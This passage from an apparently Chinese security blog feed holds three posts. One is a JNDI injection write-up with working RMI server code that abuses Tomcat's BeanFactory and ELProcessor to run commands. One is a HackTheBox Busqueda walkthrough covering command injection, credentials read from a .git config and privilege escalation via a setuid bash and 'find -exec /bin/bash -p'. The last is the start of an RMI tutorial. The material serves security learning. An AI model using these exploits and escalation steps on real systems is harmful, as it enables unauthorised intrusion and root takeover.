</code>​这是一个静态方法，这个静态方法会返回<code>ObjectFactory</code>​类型,并且这里使用了newInstance构造，所以这个类还需要满足拥有无参构造方法<br>​<code>ObjectFactory</code>​我们上面有提到是一个接口类，他只有一个抽象方法,<code>getObjectFactory</code>​</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>而刚刚好​<code>org.apache.naming.factory.BeanFactory</code>​满足所有要求，在<code>BeanFacory</code>​中的<code>getObjectInstance</code>​可以精心构造，从而执行恶意代码。</p><p>但是若是想要执行这个恶意代码还需要一个​<code>JavaBean</code>​，<code>JaveBean</code>​需要满足的条件：<br>（1）​<code>forceString</code>​指定某个特殊方法名<br>RefAddr ra &#x3D; ref.get(&quot;forceString&quot;);<br>（2）拥有无参构造方法<br>beanClass.newInstance()<br>（3）含有恶意方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELProcessor</span> <span class="token punctuation">{</span> <span class="token keyword">public</span> Object <span class="token function">eval</span><span class="token punctuation">(</span>String expression<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>需要提前设置好pom的依赖：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.5.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>com.springsource.org.apache.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>7.0.26<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>我这里Maven用的是阿里云的镜像，这个el文件加载不到，于是我下了一个jar包，然后导入进去就可以了<br><a href="https://youngkylin.yuque.com/attachments/yuque/0/2023/jar/28868587/1681535605139-d0e4db70-261d-4fde-a812-fd0658fd9de3.jar">📎com.springsource.org.apache.el-7.0.26.jar</a><br>RMIServer端：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ResourceRef<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>StringRefAddr<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResourceRef ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>RMIClient端：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RmiClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/Object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行结果：</p><h2 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h2><p>一路跟进lookup直到​<code>RegistryContext</code>​的<code>decodeObject</code>​中<br>不加载远程类进入​<code>NamingManager</code>​<br>进入​<code>NamingManager</code>​之后是调用<code>BeanFactory</code>​的<code>getObjectInstance</code>​<br>46行加载恶意的​<code>JavaBean</code>​类<code>ELProcessor</code>​<br>58行获取​<code>forceString</code>​的属性，即x&#x3D;eval<br>这一步可以使得强制将bean对象某个属性的setter方法名指定为非setXXX()。从而就算不用使用setxxx()的方法也可以传入beanClas.getMethod()中，这样就可以成功把我们恶意的代码放到hashMap中。<br>再通过我们第二个add的元素x来作为方法名反射获取一个参数类型是 ​​String.class​的方法<br>后面反射调用就成功执行恶意代码了</p><h2 id="踩的坑"><a href="#踩的坑" class="headerlink" title="踩的坑"></a>踩的坑</h2><h3 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h3><p>RMIServer端代码有问题：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>StringRefAddr<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ResourceRef<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResourceRef resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>                <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"Runtime.getRuntime().exec('calc')"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/exp"</span><span class="token punctuation">,</span> resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>报错：</p><pre class=" language-xml"><code class="language-xml">Exception in thread "main" javax.naming.NamingException: Forced String setter eval threw exception for property x    at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:215)    at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:321)    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)    at javax.naming.InitialContext.lookup(InitialContext.java:417)    at org.example.RmiClient.main(RmiClient.java:7)</code></pre><p>原因chatgpt说是：</p><pre class=" language-xml"><code class="language-xml">这段代码中创建的ResourceRef对象中的攻击代码也不同于之前的代码。它使用了Java的反射机制动态加载并执行了一个JavaScript脚本，以触发远程命令执行。这种方式比之前代码中的攻击代码更灵活和可移植，因为JavaScript引擎是Java标准库的一部分，不依赖于特定的JDK实现或其他依赖项。因此，这段代码可以在大多数JDK版本中运行，并且具有更好的可移植性和灵活性，可以更容易地触发远程命令执行。</code></pre><h3 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h3><p>试图使用SpringBoot启动，因为​<code>SpringBoot</code>​自带tomcat。但是现在新建的<code>SpringBoot</code>​的<code>Tomcat</code>​的版本都是9.x，而这个漏洞在Tomcat版本8.5.85已经被修复了，如果试图修改<code>SpringBoot</code>​内置的<code>tomcat</code>​也有办法，但是麻烦麻烦麻烦。</p><p>如果打高版本的​<code>Tomcat</code>​就会出现如下报错信息：</p><pre class=" language-xml"><code class="language-xml">四月 14, 2023 12:17:31 下午 org.apache.naming.factory.BeanFactory getObjectInstance警告: The forceString option has been removed as a security hardening measure. Instead, if the setter method doesn't use String, a primitive or a primitive wrapper, the factory will look for a method with the same name as the setter that accepts a String and use that if found.Exception in thread "main" javax.naming.NamingException: No set method found for property [x]    at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:206)    at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:321)    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)    at javax.naming.InitialContext.lookup(InitialContext.java:417)    at com.example.demospring.RMIClient.main(RMIClient.java:10)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB_Busqueda</title>
      <link href="/2023/04/05/HTB%20Busqueda/"/>
      <url>/2023/04/05/HTB%20Busqueda/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-Busqueda"><a href="#HTB-Busqueda" class="headerlink" title="HTB Busqueda"></a>HTB Busqueda</h1><h3 id="起步准备"><a href="#起步准备" class="headerlink" title="起步准备"></a>起步准备</h3><p><strong>官网注册：</strong>​<a href="https://app.hackthebox.com/">https://app.hackthebox.com</a></p><p><strong>注册完之后准备使用kali连接vpn了：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130826-wx5ents.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130829-1adkl2k.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130835-6v2ym90.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130839-tv6gkfh.png" alt="image">​​</p><p><strong>下载好后，会有一个ovpn文件：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130854-agj6vp9.png" alt="image">​​</p><p><strong>把这个文件放到Kali里面（这里最好放到是选择普通用户的目录，这样子可以直接复制粘贴，要是直接放在桌面也可以，个人觉得还是创建一个专属于靶机的目录比较好），使用命令：</strong></p><p><strong>openvpn lab.ovpn</strong></p><p><strong>连接一下</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130848-hi9mgpb.png" alt="image">​​</p><h3 id="开启题目"><a href="#开启题目" class="headerlink" title="开启题目"></a>开启题目</h3><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130858-qtmr22s.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130902-ohvs8gl.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130905-2iuhlis.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130909-ruv7c8v.png" alt="image">​​</p><p><strong>启动之后会有一个内网地址：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130911-tfef5uo.png" alt="image">​​</p><h2 id="Busqueda"><a href="#Busqueda" class="headerlink" title="Busqueda"></a>Busqueda</h2><h3 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h3><p><strong>启动靶机，有一个IP：10.10.11.208，直接访问好像并行不通：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130915-kebkcqm.png" alt="image">​​</p><p><strong>Nmap使用命令</strong>​<code>nmap -A</code>​扫描后得到如下结果：</p><pre class=" language-bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> 10.10.11.208 <span class="token punctuation">(</span>10.10.11.208<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.41s latency<span class="token punctuation">)</span>.Not shown: 997 closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>PORT     STATE    SERVICE  VERSION22/tcp   <span class="token function">open</span>     <span class="token function">ssh</span>      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey: <span class="token operator">|</span>   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>80/tcp   <span class="token function">open</span>     http     Apache httpd 2.4.52<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: Did not follow redirect to http://searcher.htb/1149/tcp filtered bvtsonarService Info: Host: searcher.htb<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 163.39 seconds</code></pre><p><strong>发现他的</strong>​<code>Hosts</code>​是<code>sercher.htb</code>​</p><p><strong>在root权限下使用：</strong></p><p><strong>echo &quot;10.10.11.208 sercher.htb&quot;&gt;&gt;&#x2F;etc&#x2F;hosts</strong></p><p><strong>&#x2F;&#x2F;切记切记，这里用的是追加写入，不要覆盖写了</strong></p><p><strong>把这个DNS情况输入到本机情况，这样子就可以访问了：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130919-xs85eji.png" alt="image">​​</p><p><strong>访问之后发现下面有一个</strong>​<code>Powered by Flask and Searchor 2.4.0</code>​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130923-7w869jp.png" alt="image">​​</p><p><strong>发现输入什么返回什么，有两个想法：</strong></p><ol><li><strong>SSTI模板注入</strong></li><li><strong>系统命令执行</strong></li></ol><p><strong>第一想法肯定是SSTI注入，怎么有人傻傻地后台使用危险函数来回显用户输入</strong></p><p><strong>测试SSTI：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130927-rqa2ok3.png" alt="image">​​</p><p><strong>什么居然不是SSTI</strong></p><p><strong>不会真的是系统命令吧</strong></p><p><strong>尝试系统命令：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130932-eg0cf4a.png" alt="image">​​</p><p><strong>我天，真的是，你不如杀了我</strong></p><p><strong>那就反弹shell了，原本是尝试反弹到公网IP的，但是失败了，不知道是不出网还是什么原因，那就弹到Kali吧：</strong></p><p><strong>先看一下kali的IP地址</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130935-jpnhwsg.png" alt="image">​​</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130938-tjjqxwx.png" alt="image">​​</p><p><strong>吃到shell后就可以执行命令了：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130942-f2f5z2u.png" alt="image">​​</p><p><strong>然后我的思路就完全卡壳了，我flag呢</strong></p><p><strong>于是接下来都是WP的思路了：</strong></p><p><strong>原来还有一个.git文件（其实刚才看到有用到github的项目就应该想到有.git了），以后执行查看文件都用ll了，用ls会漏掉隐藏文件</strong></p><p><strong>对.git文件的信息收集有点不知道，恶补一下：</strong>​<a href="https://blog.csdn.net/start_mao/article/details/94609238">https://blog.csdn.net/start_mao&#x2F;article&#x2F;details&#x2F;94609238</a></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130945-3okta9u.png" alt="image">​​</p><p><strong>然后</strong>​<code>cat config</code>​查看仓库的配置信息</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130950-nlihi6m.png" alt="image">​​</p><p><strong>这里可以看出来</strong></p><p><strong>用户名:cody</strong></p><p><strong>密码:jh1usoih2bkjaspwe92</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130954-arut9dc.png" alt="image">​​</p><p><strong>但是使用whoami的时候又有一个用户名，使用ssh登陆的时候可以发现用户名其实是svc</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604130957-8gfopbn.png" alt="image">​​</p><p><strong>ssh连接果然可以连接上以后</strong></p><p><strong>执行命令sudo -l</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604131001-jyrrs06.png" alt="image">​​</p><p><strong>按他的提示我们运行一下这个py脚本：</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604131005-hheppei.png" alt="image">​​</p><p><strong>提示需要一个full-checkup的东西，wp说是sh脚本，不知道为什么。。。</strong></p><pre class=" language-bash"><code class="language-bash">回显su: must be run from a terminal 需要一个终端利用以下代码解决：<span class="token keyword">echo</span> <span class="token string">"import pty; pty.spawn('/bin/bash')"</span> <span class="token operator">></span> /tmp/asdf.pypython /tmp/asdf.py</code></pre><p>‍</p><p>那就创建这个脚本：</p><p>vim full-checkup.sh</p><p>内容：</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">chmod</span> +s /bin/bash</code></pre><p>接着赋予这个脚本+x权限</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> +x full-checkup.sh</code></pre><p>下一步就是提权了</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/bin/python3 /opt/scripts/system-checkup.py  full-checkup</code></pre><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604131015-eakz84x.png" alt="image">​​</p><p><strong>出现Done！则表示提权成功</strong></p><p>输入命令 <code>/bin/bash</code>​ 进入bash模式的命令行</p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604131020-fcgxft7.png" alt="image">​​</p><p><strong>接下来使用find提权：</strong></p><p><strong>find . -exec &#x2F;bin&#x2F;bash -p ;</strong></p><p><strong>如果find命令有suid则可以利用find命令提权，这里注意应该加上-p参数，网上大多数版本并没有-p选项，导致不能真正的以root权限开启一个新的shell</strong></p><p><strong>利用普通用户执行find命令，要查找一个存在的文件，这里的点是查找当前目录</strong></p><p><strong>-p参数的解释：</strong></p><p>**当真实用户id和有效用户id不匹配时打开。禁用处理$ENV文件和导入shell功能。关闭此选项将导致有效的uid和Gid设置为真实uid和Gid。 **</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -p参数-p  Turned on whenever the real and effective user ids <span class="token keyword">do</span> not match.    Disables processing of the <span class="token variable">$ENV</span> <span class="token function">file</span> and importing of shell    functions.  Turning this option off causes the effective uid and    gid to be <span class="token keyword">set</span> to the real uid and gid.</code></pre><p>​​​<img src="/Blogimages/HTB_Busqueda/image-20230604131029-yhbb2wc.png" alt="image">​​​</p><p><strong>这样子就成功变成root权限了，最后进入到&#x2F;root，可以拿到root.txt这个flag</strong></p><p>​​<img src="/Blogimages/HTB_Busqueda/image-20230604131032-71699oh.png" alt="image">​​</p><p><strong>还有一个flag在&#x2F;home&#x2F;svc 下，两个都交完应该算是完成了</strong></p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RMI</title>
      <link href="/2023/04/02/RMI/"/>
      <url>/2023/04/02/RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="RMI概述"><a href="#RMI概述" class="headerlink" title="RMI概述"></a>RMI概述</h2><p> RMI(Remote Method Invocation)，远程方法调用。说直白点就是可以利用机器A调用远程机器B上面的方法。但是这是依赖JVM实现的，所以也只能从一个JVM到另一个JVM去调用。<br>话不多说来个简单的代码理解：<br>我们首先敲服务端的代码：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Registry registry<span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"remoteObj"</span><span class="token punctuation">,</span> remoteObj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p> 然后完善RemoteObjImpl类：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RemoteObjImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">IRemoteObj</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">RemoteObjImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span 